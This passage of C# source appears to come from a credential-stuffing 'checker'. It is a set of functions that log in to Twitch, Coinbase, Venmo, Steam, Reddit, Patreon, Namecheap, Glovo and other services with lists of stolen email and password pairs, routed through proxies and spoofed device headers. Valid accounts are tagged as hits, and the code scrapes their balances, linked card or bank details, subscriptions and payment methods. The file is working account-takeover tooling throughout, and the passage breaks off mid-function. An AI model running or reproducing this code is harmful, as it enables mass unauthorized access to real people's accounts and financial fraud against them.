                            req.ClearAllHeaders();

                            req.AddHeader("referer", "https://restocks.net/account");
                            req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36 Edg/86.0.622.38");
                            req.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                            req.AddHeader("accept-encoding", "gzip, deflate, br");
                            req.AddHeader("accept-language", "en-US,en;q=0.9");

                            HttpResponse get_cap = req.Get(new Uri("https://restocks.net/account/purchases/history?page=1&search="));

                            string capture = get_cap.ToString();
                            if (capture.Contains("We have no orders for you yet.")) return "Orders: No";
                            return "Orders: Yes";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }



        #region Twitch
        static string Twitch(string login, string password)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("Content-Type", "text/plain;charset=UTF-8");
                        req.Referer = "https://www.twitch.tv/";

                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) twitch-desktop-electron-platform/1.0.0 Chrome/78.0.3904.130 Electron/7.3.1 Safari/537.36 desklight/8.56.1";

                        string strResponse = req.Post(new Uri("https://passport.twitch.tv/login"), new BytesContent(Encoding.Default.GetBytes("{\"username\":\"" + login + "\",\"password\":\"" + password + "\",\"client_id\":\"jf3xu125ejjjt5cl4osdjci6oz6p93r\",\"undelete_user\":false}"))).ToString();

                        if (strResponse.Contains("\"access_token\""))
                        {
                            string accessToken = Regex.Match(strResponse, "{\"access_token\":\"(.*?)\"").Groups[1].Value;

                            string captures = TwitchGetCaptures(accessToken);

                            if (captures == "")
                                return "Hit";

                            return captures;
                        }
                        else if (strResponse.Contains("obscured_email"))
                        {
                            return "2FA";
                        }
                        else if (strResponse.Contains("Incorrect username or password"))
                        {
                            return "Bad";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        static string TwitchGetCaptures(string accessToken)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.Authorization = "OAuth " + accessToken;
                        req.AddHeader("Client-Id", "jf3xu125ejjjt5cl4osdjci6oz6p93r");
                        req.Referer = "https://www.twitch.tv/subscriptions";

                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) twitch-desktop-electron-platform/1.0.0 Chrome/78.0.3904.130 Electron/7.3.1 Safari/537.36 desklight/8.56.1";

                        string strResponse = req.Post(new Uri("https://gql.twitch.tv/gql"), "[{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"GIFT\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"PLATFORM\",\"platform\":\"MOBILE_ALL\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_SubscriptionBenefits\",\"variables\":{\"limit\":100,\"cursor\":\"\",\"filter\":\"ALL\",\"platform\":\"WEB\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"ad8308801011d87d3b4aa3007819a36e1f1e1283d4b61e7253233d6312a00442\"}}},{\"operationName\":\"SubscriptionsManagement_ExpiredSubscriptions\",\"variables\":{\"limit\":100,\"cursor\":\"\"},\"extensions\":{\"persistedQuery\":{\"version\":1,\"sha256Hash\":\"fa5bcd68980e687a0b4ff2ef63792089df1500546d5f1bb2b6e9ee4a6282222b\"}}}]", "text/plain;charset=UTF-8").ToString();

                        string hasPrime = Regex.Match(strResponse, "hasPrime\":(.*?),").Groups[1].Value;

                        if (hasPrime.Contains("true"))
                            return "Has Twitch Prime";
                        else
                            return "Free";
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        #endregion



        static string Gamefly(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("Accept", "application/json, text/plain, */*");
                        req.AddHeader("Connection", "keep-alive");
                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("Host", "api.gamefly.com");
                        req.AddHeader("Origin", "https://www.gamefly.com");
                        req.AddHeader("Referer", "https://www.gamefly.com/games");
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36");
                        req.AddHeader("X-SOURCE", "GFRES");
                        string data = "{\"email\":\"" + email + "\", \"password\":\"" + password + "\"}";
                        HttpResponse res = req.Post(new Uri("https://api.gamefly.com/api/Account/Authenticate"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();
                        if (login.Contains("Invalid Email Address or Password"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("accessToken"))
                        {
                            string rewardlvl = Parse(login, "\"},\"rewardLevelId\":", ",\"");
                            return $"Reward level ID: {rewardlvl}";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }


        #region Coinbase

        static string Coinbase(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        string one = Utils.GenerateRandomNo() + Utils.GenerateRandomNo() + Utils.GenerateRandomNo() + Utils.RandomUpper();
                        string two = Utils.RandomUpper() + Utils.RandomUpper() + Utils.GenerateRandomNo() + Utils.GenerateRandomNo();
                        string three = Utils.GenerateRandomNo() + Utils.RandomUpper() + Utils.GenerateRandomNo() + Utils.GenerateRandomNo();
                        string four = Utils.GenerateRandomNo() + Utils.GenerateRandomNo() + Utils.GenerateRandomNo() + Utils.GenerateRandomNo();
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        req.AddHeader("X-Device-Model", "iPhone11,8");
                        req.AddHeader("X-Device-Manufacturer", "Apple");
                        req.AddHeader("X-IDFA", "AE61D427-8F8A-" + one + "-" + two + "-220819FB05FD");
                        req.AddHeader("CB-CLIENT", "com.vilcsak.bitcoin2/6.4.0/9441");
                        req.AddHeader("CB-VERSION", "2019-04-16");
                        req.AddHeader("X-Os-Version", "12.3.1");
                        req.AddHeader("X-App-Build-Number", "9441");
                        req.AddHeader("X-IDFV", "629F0882-4BE4-" + three + "-" + four + "-DBD099BC48B0");
                        req.AddHeader("X-App-Version", "6.4.0");
                        req.AddHeader("Connection", "keep-alive");
                        req.AddHeader("Accept-Language", "en");
                        req.AddHeader("Accept", "application/json");
                        req.AddHeader("X-Device-Brand", "Apple");
                        req.AddHeader("Host", "api.coinbase.com");
                        req.AddHeader("X-Os-Name", "iOS");
                        req.AddHeader("User-Agent", "Coinbase/6.4.0 (com.vilcsak.bitcoin2; build:9441; iOS 12.3.1) Alamofire/4.7.0");
                        string data = "client_id=6011662b0badfa97f9fed5a246526277ff2116affa98cfaacacd012a191ba38d&password=" + password + "&redirect_uri=2_legged&scope=all&username=" + email;
                        HttpResponse res = req.Post(new Uri("https://api.coinbase.com/oauth/authorize/with-credentials"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();

                        if (login.Contains("incorrect_credentials")) return "Bad";
                        if (login.Contains("2fa_required")) return "2FA";
                        if (login.Contains("unverified_email")) return "Free";
                        if (login.Contains("success\":true")) return "Hit";
                        Check.errors++;
                        continue;
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }

        #endregion



        #region Venmo

        static string Venmo(string login, string password)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        string guid = Guid.NewGuid().ToString();

                        CookieStorage cookies = new CookieStorage();
                        string csrfToken = VenmoGetCSRF(ref cookies);

                        req.Cookies = cookies;
                        req.UserAgent = "Venmo/8.4.0 (iPhone; iOS 13.2; Scale/3.0)";
                        req.AddHeader("Content-Type", "application/json");
                        req.AddHeader("Accept", "application/json; charset=utf-8");
                        req.AddHeader("Accept-Language", "en-US;q=1.0,el-GR;q=0.9");
                        req.AddHeader("device-id", guid);
                        req.AddHeader("csrftoken2", csrfToken);

                        HttpResponse res = req.Post(new Uri("https://api.venmo.com/v1/oauth/access_token"), new BytesContent(Encoding.Default.GetBytes("{\"phone_email_or_username\":\"" + login + "\",\"password\":\"" + password + "\",\"client_id\":\"1\"}")));
                        string strResponse = res.ToString();

                        if (strResponse.Contains("Additional authentication is required"))
                        {
                            string secret = res["venmo-otp-secret"];
                            string capture = "";

                            for (int i2 = 0; i2 < Config.retries + 1; i2++)
                            {
                                capture = VenmoGetCaptures(cookies, secret, guid);
                                if (capture != "") break;
                            }

                            if (capture == "")
                                return $"Capture Failed";

                            return capture;
                        }
                        else if (strResponse.Contains("{\"message\": \"Your email or password was incorrect.\""))
                        {
                            return "Bad";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }
        static string VenmoGetCSRF(ref CookieStorage cookies)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        cookies = new CookieStorage();
                        req.Cookies = cookies;
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";

                        req.Post(new Uri("https://api.venmo.com/v1/oauth/access_token"), "{}", "application/json").ToString();


                        return cookies.GetCookies("https://api.venmo.com/")["csrftoken2"].Value;
                    }
                }
                catch
                {
                    Check.errors++;
                }
            return "";
        }
        static string VenmoGetCaptures(CookieStorage cookies, string secret, string guid)
        {
            while (true)
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);

                        req.AddHeader("device-id", guid);
                        req.AddHeader("Venmo-Otp-Secret", secret);
                        req.AddHeader("Content-Type", "application/json; charset=utf-8");
                        req.AddHeader("Venmo-Otp", "501107");
                        req.UserAgent = "Venmo/8.6.0 (iPhone; iOS 14.0; Scale/3.0)";
                        req.Cookies = cookies;

                        string strResponse = req.Get(new Uri($"https://api.venmo.com/v1/account/two-factor/token?client_id=1")).ToString();

                        if (strResponse.Contains("\", \"question_type\": \"card\"}]"))
                        {
                            string bankInfo = Regex.Match(strResponse, "\\[{\"value\": \"(.*?)\", \"question_type\": \"card\"}").Groups[1].Value;

                            return $"Bank Infomation: {bankInfo}";
                        }
                        else
                        {
                            return "Free";
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
        }

        #endregion


        #region Cold Stone

        static string ColdStone(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("accept", "application/json, text/plain, */*");
                        req.AddHeader("accept-encoding", "gzip, deflate, br");
                        req.AddHeader("accept-language", "en-US,en;q=0.9");
                        req.AddHeader("content-type", "application/json;charset=UTF-8");
                        req.AddHeader("origin", "https://my.spendgo.com");
                        req.AddHeader("referer", "https://my.spendgo.com/coldstone/index.html");
                        req.AddHeader("sec-fetch-dest", "empty");
                        req.AddHeader("sec-fetch-mode", "cors");
                        req.AddHeader("sec-fetch-site", "same-origin");
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";
                        req.AddHeader("Content-Type", "application/json;charset=UTF-8");
                        string data = "{\"email\":\"" + email + "\"}";
                        HttpResponse res = req.Post(new Uri("https://my.spendgo.com/consumer/gen/spendgo/v1/lookup"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string res_str = res.ToString();
                        if (res_str.Contains("{\"status\":\"NotFound\"}"))
                        {
                            return "Bad";
                        }
                        else if (res_str.Contains("{\"status\":\"Activated\"}") || res_str.Contains("{\"status\":\"Found\"}"))
                        {
                            req.AddHeader("Content-Type", "application/json;charset=UTF-8");
                            req.AddHeader("accept", "application/json");
                            req.AddHeader("accept-encoding", "gzip, deflate, br");
                            req.AddHeader("accept-language", "en-US,en;q=0.9");
                            req.AddHeader("origin", "https://my.spendgo.com");
                            req.AddHeader("referer", "https://my.spendgo.com/coldstone/index.html");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-site", "same-origin");
                            req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
                            string data2 = "{\"value\":\"" + email + "\",\"password\":\"" + password + "\"}";
                            HttpResponse res2 = req.Post(new Uri("https://my.spendgo.com/consumer/gen/spendgo/v1/signin"), new BytesContent(Encoding.Default.GetBytes(data2)));
                            string res2_str = res2.ToString();
                            if (res2_str.Contains("password incorrect"))
                            {
                                return "Bad";
                            }
                            else if (res2_str.Contains("username\":\""))
                            {
                                JObject jsonObj = (JObject)JsonConvert.DeserializeObject(res2_str);
                                string id = jsonObj["spendgo_id"].ToString();

                                req.AddHeader("Content-Type", "application/json;charset=UTF-8");
                                req.AddHeader("accept", "application/json, text/plain, */*");
                                req.AddHeader("accept-encoding", "gzip, deflate, br");
                                req.AddHeader("accept-language", "en-US,en;q=0.9");
                                req.AddHeader("origin", "https://my.spendgo.com");
                                req.AddHeader("referer", "https://my.spendgo.com/coldstone/index.html");
                                req.AddHeader("sec-fetch-dest", "empty");
                                req.AddHeader("sec-fetch-mode", "cors");
                                req.AddHeader("sec-fetch-site", "same-origin");
                                req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36");
                                string data3 = "{\"spendgo_id\":\"" + id + "\"}";
                                HttpResponse res3 = req.Post(new Uri("https://my.spendgo.com/consumer/gen/coldstone/v2/rewardsAndOffers"), new BytesContent(Encoding.Default.GetBytes(data3)));
                                string res3_string = res3.ToString();
                                JObject capJson = (JObject)JsonConvert.DeserializeObject(res3_string);

                                string rewards = capJson["rewards_count"].ToString();
                                string points = capJson["point_total"].ToString();
                                if (Convert.ToInt32(points) < 26)
                                {
                                    return "Free";
                                }
                                else
                                {
                                    return $"Points: {points} | Rewards: {rewards}";
                                }
                            }
                            else
                            {
                                Check.errors++;
                                continue;
                            }

                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }

        #endregion

        #region Glovo

        static string Glovo(string emaill, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("glovo-api-version", "13");
                        req.AddHeader("glovo-app-development-state", "Production");
                        req.AddHeader("glovo-app-platform", "web");
                        req.AddHeader("glovo-app-type", "customer");
                        req.AddHeader("glovo-app-version", "7");
                        req.AddHeader("glovo-device-id", "129996511");
                        req.AddHeader("glovo-language-code", "en");
                        req.AddHeader("origin", "https://glovoapp.com");
                        req.AddHeader("sec-fetch-dest", "empty");
                        req.AddHeader("sec-fetch-mode", "cors");
                        req.AddHeader("sec-fetch-site", "same-site");
                        req.AddHeader("Content-Type", "application/json");
                        string data = "{\"grantType\":\"password\",\"username\":\"" + emaill + "\",\"password\":\"" + password + "\"}";
                        HttpResponse res = req.Post(new Uri("https://api.glovoapp.com/oauth/token"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();
                        if (login.Contains("bad credentials"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("\":{\"accessToken\":\""))
                        {
                            string token = Parse(login, "{\"accessToken\":\"", "\",\"");
                            req.ClearAllHeaders();
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("authorization", token);
                            req.AddHeader("glovo-api-version", "13");
                            req.AddHeader("glovo-app-development-state", "Production");
                            req.AddHeader("glovo-app-platform", "web");
                            req.AddHeader("glovo-app-type", "customer");
                            req.AddHeader("glovo-app-version", "7");
                            req.AddHeader("glovo-device-id", "129996511");
                            req.AddHeader("glovo-language-code", "en");
                            req.AddHeader("glovo-location-city-code", "BEG");
                            req.AddHeader("origin", "https://glovoapp.com");
                            HttpResponse cap_res = req.Get(new Uri("https://api.glovoapp.com/v3/me"));
                            string cap = cap_res.ToString();
                            string cc = Parse(cap, "\"currentCard\":", ",");
                            if (cc == "null")
                            {
                                cc = "None";
                            }
                            string bal = Parse(cap, "\"virtualBalance\"", ",\"").Replace(":{\"balance\":", "").Replace("}", "");
                            return $"CC: {cc} | Balance: {bal}";
                        }
                        else if (login.Contains("You've reached an API limit") || Convert.ToInt32(res.StatusCode) == 429)
                        {
                            Check.errors++;
                            continue;
                        }
                        else if (login.Contains("{\"access\":null,\"twoFactor"))
                        {
                            return "2FA";
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }

        #endregion



        #region Namecheap

        static string Namecheap(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        bool changed = false;
                        string user = "";
                        int index = email.IndexOf("@");
                        if (index > 0)
                        {
                            changed = true;
                            user = email.Substring(0, index);
                        }
                        else
                        {
                            changed = false;
                            user = email;
                        }

                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                        req.AddHeader("Pragma", "no-cache");
                        req.AddHeader("Accept", "*/*");
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                        string data = "LoginUserName=" + user + "&LoginPassword=" + password + "&hidden_LoginPassword=";
                        HttpResponse res = req.Post(new Uri("https://www.namecheap.com/myaccount/login/"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();
                        if (!login.Contains("Last logged"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("Last logged"))
                        {
                            HttpResponse get_bal = req.Get(new Uri("https://ap.www.namecheap.com/Profile/Billing/Topup"));
                            string get_bal_str = get_bal.ToString();
                            string bal = Parse(get_bal_str, "Current Balance</b></div><div class=\"gb-col-auto\">", "<");

                            HttpResponse get_cc = req.Get(new Uri("https://ap.www.namecheap.com/profile/billing/PaymentCards"));
                            string get_cc_str = get_cc.ToString();
                            string cc = Parse(get_cc_str, "<h2>", "</h2>");
                            if (cc.Contains("card in your account"))
                            {
                                string cap = Parse(get_cc_str, "<h2>You have ", " card");
                                if (changed)
                                {
                                    return $"UserPass: {user}:{password} | Balance: {bal} | CC Linked: {cap}";

                                }
                                else
                                {
                                    return $"Balance: {bal} | CC Linked: {cap}";
                                }
                            }
                            else
                            {
                                if (changed)
                                {
                                    return $"UserPass: {user}:{password} | Balance: {bal}";
                                }
                                else
                                {
                                    return $"Balance: {bal}";
                                }

                            }
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }

                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            };
        }

        #endregion


        #region Steam
        static string SteamCheck(string login, string password)
        {

            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        CookieStorage cookies = new CookieStorage();
                        SetBasicRequestSettingsAndProxies(req);

                        req.Cookies = cookies;
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";

                        string sResponse = req.Get("https://store.steampowered.com/login/?l=english").ToString();

                        if (!sResponse.Contains("<title>Login</title>"))
                        {
                            Check.errors++;
                            continue;
                        }



                        req.Referer = "https://help.steampowered.com/en/wizard/Login?redir=%2Fen%2F";
                        string sResponse2 = req.Post("https://help.steampowered.com/en/login/getrsakey/", $"username={login}", "application/x-www-form-urlencoded").ToString();

                        string publickey_mod = Regex.Match(sResponse2, "publickey_mod\":\"(.*?)\"").Groups[1].Value;
                        string publickey_exp = Regex.Match(sResponse2, "publickey_exp\":\"(.*?)\"").Groups[1].Value;
                        string timestamp = Regex.Match(sResponse2, "timestamp\":\"(.*?)\"").Groups[1].Value;

                        string newPass = System.Web.HttpUtility.UrlEncode(Utils.RSAEncryption(password, publickey_mod, publickey_exp));


                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36";
                        req.Referer = "https://help.steampowered.com/en/wizard/Login?redir=%2Fen%2F";
                        req.AddHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
                        req.AddHeader("X-Requested-With", "XMLHttpRequest");
                        string strResponse = req.Post(new Uri("https://help.steampowered.com/en/login/dologin/"), new BytesContent(Encoding.Default.GetBytes($"password={newPass}&username={login}&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp={timestamp}&remember_login=false"))).ToString();

                        if (strResponse.Contains("requires_twofactor\":true,\"") || strResponse.Contains("emailauth_needed\":true"))
                        {
                            return "2FA";
                        }
                        else if (strResponse.Contains("success\":true"))
                        {
                            req.Referer = "https://store.steampowered.com/login/?l=english";
                            string capResp = req.Get("https://store.steampowered.com/account/").ToString();

                            string steamid = Regex.Match(sResponse2, "\"steamid\":(.*?),").Groups[1].Value.Replace("\"", "");

                            string capResp2 = req.Get("https://steamcommunity.com/profiles/" + steamid).ToString();

                            if (capResp.Contains("s account</title>"))
                            {
                                string balance = Regex.Match(sResponse2, "accountData price\">(.*?)</div>").Groups[1].Value;

                                string strGames = "";

                                Match games = Regex.Match(strResponse, "href=\"https://steamcommunity\\.com/app/(.*?)</a></div>");

                                while (true)
                                {
                                    strGames += games.Groups[1].Value;

                                    games = games.NextMatch();

                                    if (games.Groups[1].Value == "")
                                        break;
                                    else
                                        strGames += ", ";
                                }

                                return $"Balance: {balance} - Games: [{games}]";
                            }
                            return "Hit";
                        }
                        else if (strResponse.Contains("captcha_needed\":true"))
                        {
                            Check.errors++;
                            continue;
                        }
                        else if (strResponse.Contains("Incorrect account name or password.") || strResponse.Contains("The account name or password that you have entered is incorrect"))
                            return "Bad";
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }
        }
        #endregion

        #region Reddit

        static Uri redditAuth = new Uri("https://www.reddit.com/login/", UriKind.Absolute);
        static Uri redditAuthPost = new Uri("https://www.reddit.com/login", UriKind.Absolute);
        static string RedditCheck(string login, string password)
        {
            if (login.Contains("@"))
                login = login.Split('@')[0];
            for (int i = 0; i < Config.retries + 1; i++)
            {
                while (true)
                {
                    try
                    {
                        CookieStorage cookies = new CookieStorage();

                        string csrf_token = RedditGetCSRF(ref cookies);

                        if (csrf_token == "") continue;

                        BytesContent postdata;
                        try
                        {
                            postdata = new BytesContent(Encoding.Default.GetBytes($"csrf_token={csrf_token}&otp=&password={password}&dest=https%3A%2F%2Fwww.reddit.com&username={login}"));
                        }
                        catch { continue; }

                        ///////////////////////////////////////////

                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            req.Cookies = cookies;
                            req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                            req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36";

                            HttpResponse res = req.Post(redditAuthPost, postdata);

                            if (res.StatusCode == HttpStatusCode.OK)
                            {
                                string strRes = res.ToString();
                                if (strRes.Contains("{\"dest\": \"https://www.reddit.com\"}"))
                                {
                                    //
                                }
                                else
                                {
                                    break;
                                }

                            }
                            else
                            {
                                break;
                            }
                        }

                        var karma = "0";

                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            req.Cookies = cookies;
                            HttpResponse res = req.Get(new Uri("https://www.reddit.com/"));

                            if (res.StatusCode == Leaf.xNet.HttpStatusCode.OK)
                            {
                                string strRes = res.ToString();

                                karma = Regex.Match(strRes, "totalKarma\":(.*?),").Groups[1].Value;
                                if (karma == "")
                                {
                                    karma = "?";
                                }
                                return "Karma: " + karma;
                            }
                        }
                    }
                    catch
                    {
                        Check.errors++;
                    }
                }
            }
            return "Bad";
        }
        static string RedditGetCSRF(ref CookieStorage cookies)
        {

            while (true)
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        cookies = new CookieStorage();
                        req.Cookies = cookies;
                        req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36";

                        HttpResponse res = req.Get(redditAuth);
                        if (res.StatusCode == HttpStatusCode.OK)
                        {
                            string strRes = res.ToString();
                            string csrf_token = Regex.Match(strRes, "<input type=\"hidden\" name=\"csrf_token\" value=\"(.*?)\">").Groups[1].Value;

                            return csrf_token;
                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                }
            }
        }
        #endregion

        #region Patreon

        static string Patreon(string email, string password)
        {
            for (; ; )
            {
                try
                {
                    using (HttpRequest req = new HttpRequest())
                    {
                        SetBasicRequestSettingsAndProxies(req);
                        req.AddHeader("accept", "*/*");
                        req.AddHeader("accept-encoding", "gzip, deflate, br");
                        req.AddHeader("accept-language", "en-US,en;q=0.9");
                        req.AddHeader("content-type", "application/vnd.api+json");
                        req.AddHeader("cookie", "patreon_locale_code=en-US; patreon_location_country_code=US; __cfduid=d4a78ee5214179435b57491f8fbb4b2211600999720; patreon_device_id=73c88a40-faa8-44d6-964b-78de1aae8962; __cf_bm=4ddce7d1c141a2853984692ea2f33aa65da351b6-1600999720-1800-AcP/65P8WHWVAZaBQ80wx/R0B09Z4yqZhNtQF9yFCRGm/yePclYrpR3By2+loXxQdOKbgS1eyV5YWfNF7I1EAfQ=; CREATOR_DEMO_COOKIE=1; G_ENABLED_IDPS=google");
                        req.AddHeader("origin", "https://www.patreon.com");
                        req.AddHeader("referer", "https://www.patreon.com/login");
                        req.AddHeader("sec-fetch-dest", "empty");
                        req.AddHeader("sec-fetch-mode", "cors");
                        req.AddHeader("sec-fetch-site", "same-origin");
                        req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36");
                        req.AddHeader("x-csrf-signature", "Sg3rMb1o922PEstPb4LXzHqPygE3MIdMhX762CZ3S2g");
                        req.AddHeader("Content-Type", "application/json");
                        string data = "{\"data\":{\"type\":\"user\",\"attributes\":{\"email\":\"" + email + "\",\"password\":\"" + password + "\"},\"relationships\":{}}}";
                        HttpResponse res = req.Post(new Uri("https://www.patreon.com/api/login?include=campaign%2Cuser_location&json-api-version=1.0"), new BytesContent(Encoding.Default.GetBytes(data)));
                        string login = res.ToString();
                        if (login.Contains("Incorrect email or password"))
                        {
                            return "Bad";
                        }
                        else if (login.Contains("Device Verification"))
                        {
                            return "2FA";
                        }
                        else if (login.Contains("attributes"))
                        {
                            req.ClearAllHeaders();
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                            HttpResponse res2 = req.Get(new Uri("https://www.patreon.com/pledges?ty=p"));
                            string pay = res2.ToString();
                            string payment = Parse(pay, "payout_method\": \"", "\"");
                            if (payment.Contains("UNDEFINED"))
                            {
                                return "Free";
                            }
                            else
                            {
                                return "Payment Method: " + payment;
                            }


                        }
                        else
                        {
                            Check.errors++;
                            continue;
                        }
                    }
                }
                catch
                {
                    Check.errors++;
                    continue;
                }
            }
        }

        #endregion

        #region Crunchyroll
        static string CrunchyRollCheck(string email, string password)
        {
            for (int i = 0; i < Config.retries + 1; i++)
            {
                while (true)
                {
                    try
                    {
                        string guid = Utils.GetRandomHexNumber(8) + "-" + Utils.GetRandomHexNumber(4) + "-4" + Utils.GetRandomHexNumber(3) + "-8" + Utils.GetRandomHexNumber(3) + "-" + Utils.GetRandomHexNumber(12);
                        string sessionId = CrunchyRollGetSessionId(guid);

